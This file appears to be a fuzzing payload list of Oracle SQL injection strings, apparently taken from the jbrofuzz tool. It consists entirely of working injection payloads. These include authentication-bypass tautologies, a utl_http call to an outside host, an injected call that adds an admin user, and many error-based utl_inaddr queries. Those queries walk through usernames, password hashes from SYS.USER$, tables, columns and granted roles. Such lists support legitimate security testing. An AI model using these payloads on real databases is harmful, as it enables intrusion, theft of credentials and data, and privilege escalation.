# contains statements from jbrofuzz
’ or ‘1’=’1
' or '1'='1
'||utl_http.request('httP://192.168.1.1/')||'
' || myappadmin.adduser('admin', 'newpass') || '
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i

